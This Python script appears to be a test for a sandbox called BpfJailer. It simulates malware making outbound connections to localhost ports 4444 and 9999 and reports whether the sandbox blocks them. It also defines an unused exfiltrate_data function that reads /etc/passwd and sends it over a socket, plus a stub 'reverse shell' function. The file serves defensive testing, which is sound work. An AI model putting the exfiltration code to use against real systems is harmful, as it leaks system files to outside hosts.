#!/usr/bin/env python3
"""
Vulnerable App: Reverse Shell / Data Exfiltration

Simulates malware that tries to connect back to an attacker's server
to exfiltrate data or establish a reverse shell.

ATTACK: Malware connects to attacker server on port 4444

MITIGATION:
- Role: restricted (ID 1) - Blocks all network operations
- Role: isolated (ID 5) - Blocks network (allow_network: false)
- Role: webserver (ID 3) - Only allows ports 80, 443, 8080
"""
import socket
import sys
import os

def reverse_shell(attacker_ip, attacker_port):
    """Simulates reverse shell connection attempt"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((attacker_ip, attacker_port))
        sock.send(b"Pwned! Sending sensitive data...\n")
        sock.close()
        return True
    except Exception as e:
        return str(e)

def exfiltrate_data(server, port):
    """Simulates data exfiltration to external server"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((server, port))

        # Try to read and send sensitive data
        try:
            with open("/etc/passwd", "r") as f:
                data = f.read()
            sock.send(f"EXFIL: {data[:100]}".encode())
        except:
            sock.send(b"EXFIL: Could not read files")

        sock.close()
        return True
    except Exception as e:
        return str(e)

def main():
    print("=== Reverse Shell / Data Exfiltration Demo ===")
    print()

    # Test 1: Reverse shell to common attacker port
    print("Test 1: Reverse shell connection to 127.0.0.1:4444")
    sys.stdout.flush()

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex(("127.0.0.1", 4444))
        sock.close()

        if result == 13:  # EACCES
            print("BLOCKED - Permission denied (BpfJailer blocked connect)")
        elif result == 111:  # Connection refused (but connect was allowed)
            print("ALLOWED - Connection attempt succeeded (no listener)")
        elif result == 0:
            print("ALLOWED - Connected successfully")
        else:
            print(f"RESULT - Connect returned: {result}")
    except PermissionError:
        print("BLOCKED - Permission denied (BpfJailer blocked connect)")
    except OSError as e:
        if "Permission denied" in str(e) or e.errno == 13:
            print("BLOCKED - Permission denied (BpfJailer blocked connect)")
        else:
            print(f"ALLOWED - Network accessible (error: {e})")
    except Exception as e:
        print(f"ERROR - {e}")

    print()

    # Test 2: Data exfiltration to external server
    print("Test 2: Data exfiltration to external server (port 9999)")
    sys.stdout.flush()

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex(("127.0.0.1", 9999))
        sock.close()

        if result == 13:  # EACCES
            print("BLOCKED - Permission denied (BpfJailer blocked connect)")
        elif result == 111:
            print("ALLOWED - Exfiltration attempt succeeded (no listener)")
        elif result == 0:
            print("ALLOWED - Connected for exfiltration")
        else:
            print(f"RESULT - Connect returned: {result}")
    except PermissionError:
        print("BLOCKED - Permission denied (BpfJailer blocked connect)")
    except OSError as e:
        if "Permission denied" in str(e) or e.errno == 13:
            print("BLOCKED - Permission denied (BpfJailer blocked connect)")
        else:
            print(f"ALLOWED - Network accessible (error: {e})")
    except Exception as e:
        print(f"ERROR - {e}")

if __name__ == "__main__":
    main()
